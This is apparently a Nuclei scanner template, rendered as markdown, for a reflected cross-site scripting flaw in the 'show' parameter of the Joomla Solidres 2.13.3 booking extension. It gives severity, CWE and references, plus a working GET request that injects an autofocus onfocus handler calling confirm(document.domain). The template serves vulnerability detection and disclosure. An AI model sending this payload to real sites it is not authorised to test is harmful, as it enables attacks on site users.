# Nuclei Template: Joomla Solidres 2.13.3 - Cross-Site Scripting
**Template ID:** joomla-solidres-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**CWE:** CWE-79
**Source:** Nuclei Template (`joomla-solidres-xss.yaml`)

## Vulnerability Information & PoC

## Description
Joomla extension for Solidres - Online Booking System & Reservation Software is vulnerable to XSS in GET parameter 'show'.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/joomla/greenery_hub/index.php/en/hotels/reservations?location=d2tff&task=hub.search&ordering=score&direction=desc&type_id=0&show=db8ck%22onfocus=%22confirm(document.domain)%22autofocus=%22xwu0k
```

## References
- https://www.exploit-db.com/exploits/51638
- https://cxsecurity.com/issue/WLB-2023070080
- https://cyberlegion.io/joomla-solidres-2-13-3-cross-site-scripting/
